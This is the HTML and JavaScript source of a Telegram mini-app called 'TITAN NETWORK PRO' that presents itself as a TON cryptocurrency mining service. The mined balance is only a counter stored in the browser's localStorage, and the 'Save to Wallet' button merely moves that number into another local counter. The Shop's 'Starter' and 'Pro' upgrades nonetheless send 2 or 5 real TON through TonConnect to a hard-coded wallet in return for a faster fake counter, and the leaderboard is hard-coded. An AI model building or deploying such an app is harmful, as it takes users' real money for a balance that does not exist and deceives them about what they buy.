<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TITAN NETWORK PRO</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --blue: #007aff; --bg: #f8f9fa; --card: #ffffff; --green: #2ecc71; --gold: #f1c40f; }
        body { background: var(--bg); font-family: -apple-system, sans-serif; margin: 0; padding: 0; color: #333; overflow: hidden; }
        .page { display: none; height: calc(100vh - 75px); overflow-y: auto; padding-bottom: 20px; box-sizing: border-box; }
        .page.active { display: block; }

        /* Top Bar */
        .top-stats { display: flex; justify-content: space-between; padding: 15px; align-items: center; }
        .wallet-box { background: white; padding: 8px 15px; border-radius: 12px; border: 1px solid #eee; font-weight: bold; font-size: 14px; }
        .btn-save { background: var(--green); color: white; border: none; padding: 10px 18px; border-radius: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 5px; }

        /* Mining Area */
        .mining-section { text-align: center; margin-top: 10px; }
        .reactor { width: 160px; height: 160px; margin: 0 auto; border: 8px solid #eef6ff; border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; }
        .blades { width: 130px; height: 130px; background: conic-gradient(from 0deg, transparent 0%, var(--blue) 30%, transparent 40%, var(--blue) 70%, transparent 80%); border-radius: 50%; animation: spin 2s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .balance-text { font-size: 36px; font-weight: 800; margin: 15px 0 5px; }

        /* Leaderboard Items */
        .leader-card { background: white; margin: 8px 15px; padding: 12px; border-radius: 15px; display: flex; align-items: center; border: 1px solid #eee; }
        .rank { width: 30px; font-weight: bold; color: var(--blue); }

        /* Navbar */
        .nav-bar { position: fixed; bottom: 0; width: 100%; height: 75px; background: white; display: flex; border-top: 1px solid #eee; z-index: 1000; }
        .nav-item { flex: 1; text-align: center; font-size: 10px; color: #999; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; }
        .nav-item.active { color: var(--blue); font-weight: bold; }
        .nav-item i { font-style: normal; font-size: 22px; margin-bottom: 2px; }

        .btn-buy { background: var(--blue); color: white; border: none; padding: 10px 15px; border-radius: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <div id="homePage" class="page active">
        <div class="top-stats">
            <div class="wallet-box">💎 <span id="topWallet">0.0000</span></div>
            <button class="btn-save" onclick="saveToWallet()">📥 Save to Wallet</button>
        </div>
        
        <div id="ton-connect-btn" style="display:flex; justify-content:center; margin-bottom:10px;"></div>

        <div class="mining-section">
            <div class="reactor"><div class="blades"></div><div class="reactor-core">⚡</div></div>
            <div class="balance-text" id="balanceDisplay">0.00000000</div>
            <div style="color:var(--blue); font-weight:bold; margin-bottom:15px;" id="speedDisplay">⚡ 0.012 PPH</div>
            <button style="background:var(--blue); color:white; border:none; width:85%; padding:15px; border-radius:15px; font-weight:bold;" id="mineBtn" onclick="startMining()">🚀 Start Mining</button>
        </div>
    </div>

    <div id="walletPage" class="page">
        <h2 style="text-align:center;">Your Wallet</h2>
        <div style="background:white; margin:15px; padding:25px; border-radius:25px; text-align:center; border:1px solid #eee;">
            <div style="font-size:40px;">👛</div>
            <div style="font-size:32px; font-weight:800; margin:10px 0;"><span id="mainWallet">0.0000</span> TON</div>
            <p style="color:#888;">Safe Balance</p>
        </div>
    </div>

    <div id="shopPage" class="page">
        <h2 style="text-align:center;">Upgrades</h2>
        <div style="padding:0 15px;">
            <div class="leader-card" style="justify-content:space-between;">
                <span><b>Starter (+0.50)</b></span>
                <button class="btn-buy" onclick="payWithTon(2, 0.50)">2 TON</button>
            </div>
            <div class="leader-card" style="justify-content:space-between;">
                <span><b>Pro (+1.50)</b></span>
                <button class="btn-buy" onclick="payWithTon(5, 1.50)">5 TON</button>
            </div>
        </div>
    </div>

    <div id="leaderPage" class="page">
        <h2 style="text-align:center;">Top Titans 🏆</h2>
        <div class="leader-card"><div class="rank">1</div><div style="flex:1;"><b>@king_ton</b><br><small>150.0 TON</small></div><span>🥇</span></div>
        <div class="leader-card" style="border:2px solid var(--blue);"><div class="rank">?</div><div style="flex:1;"><b>Sen</b><br><small id="leaderMyBal">0.0000 TON</small></div><span>⛏️</span></div>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="showPage('homePage')" id="nav-home"><i>🏠</i>Home</div>
        <div class="nav-item" onclick="showPage('walletPage')" id="nav-wallet"><i>👛</i>Wallet</div>
        <div class="nav-item" onclick="showPage('shopPage')" id="nav-shop"><i>🚀</i>Shop</div>
        <div class="nav-item" onclick="showPage('leaderPage')" id="nav-leader"><i>🏆</i>Leaders</div>
    </div>

    <script>
        const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd";
        
        // Hata veren manifest adresini en güvenli demo adresiyle değiştirdik
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-btn'
        });

        let miningBalance = parseFloat(localStorage.getItem('miningBalance')) || 0;
        let walletBalance = parseFloat(localStorage.getItem('walletBalance')) || 0;
        let currentSpeed = parseFloat(localStorage.getItem('currentSpeed')) || 0.012;
        let isMining = localStorage.getItem('isMining') === 'true';

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            
            // Nav butonunu aktif et
            const navId = 'nav-' + id.replace('Page', '');
            if(document.getElementById(navId)) document.getElementById(navId).classList.add('active');
            
            if(id === 'leaderPage') document.getElementById('leaderMyBal').innerText = walletBalance.toFixed(4) + " TON";
            updateUI();
        }

        function startMining() {
            if(isMining) return;
            isMining = true;
            localStorage.setItem('isMining', 'true');
            document.getElementById('mineBtn').innerText = "⛏️ Mining...";
            document.getElementById('mineBtn').style.background = "#2ecc71";
            setInterval(() => {
                miningBalance += (currentSpeed / 3600);
                document.getElementById('balanceDisplay').innerText = miningBalance.toFixed(8);
                localStorage.setItem('miningBalance', miningBalance);
            }, 1000);
        }

        function saveToWallet() {
            if(miningBalance <= 0) return;
            walletBalance += miningBalance;
            miningBalance = 0;
            localStorage.setItem('walletBalance', walletBalance);
            localStorage.setItem('miningBalance', 0);
            updateUI();
            Telegram.WebApp.HapticFeedback.notificationOccurred('success');
            Telegram.WebApp.showAlert("Claim Başarılı!");
        }

        async function payWithTon(amount, speedAdd) {
            if (!tonConnectUI.connected) {
                Telegram.WebApp.showAlert("Lütfen önce cüzdanınızı bağlayın!");
                return;
            }
            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [{ address: MY_WALLET, amount: (amount * 1000000000).toString() }]
            };
            try {
                await tonConnectUI.sendTransaction(tx);
                currentSpeed += speedAdd;
                localStorage.setItem('currentSpeed', currentSpeed);
                updateUI();
                Telegram.WebApp.showAlert("Hızınız Artırıldı!");
            } catch (e) { Telegram.WebApp.showAlert("İşlem reddedildi."); }
        }

        function updateUI() {
            document.getElementById('balanceDisplay').innerText = miningBalance.toFixed(8);
            document.getElementById('topWallet').innerText = walletBalance.toFixed(4);
            document.getElementById('mainWallet').innerText = walletBalance.toFixed(4);
            document.getElementById('speedDisplay').innerText = "⚡ " + currentSpeed.toFixed(3) + " PPH";
        }

        window.onload = () => { if(isMining) startMining(); updateUI(); };
        Telegram.WebApp.ready();
    </script>
</body>
</html>
